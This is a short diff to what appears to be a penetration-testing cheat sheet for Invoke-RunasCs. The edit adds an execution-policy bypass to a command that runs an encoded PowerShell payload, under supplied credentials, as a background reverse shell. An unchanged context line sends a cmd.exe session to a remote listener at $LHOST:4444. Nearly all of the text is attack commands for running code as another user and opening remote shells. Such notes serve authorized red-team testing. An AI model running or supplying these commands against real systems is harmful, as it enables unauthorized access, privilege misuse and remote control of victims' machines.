@@ -84,7 +84,7 @@ Run commands under a different user account with explicit credentials. More flex
 
     # Background reverse shell (ProcessTimeout 0 = fire and forget, no output wait)
     Invoke-RunasCs -Username $USER -Password $PASSWORD -ProcessTimeout 0 `
-      -Command 'powershell.exe -enc $B64_PAYLOAD'
+      -Command 'powershell.exe -ep bypass -enc $B64_PAYLOAD'
 
     # Redirect stdin/stdout/stderr to a remote listener
     Invoke-RunasCs -Username $USER -Password $PASSWORD -Command 'cmd.exe' -Remote '$LHOST:4444'
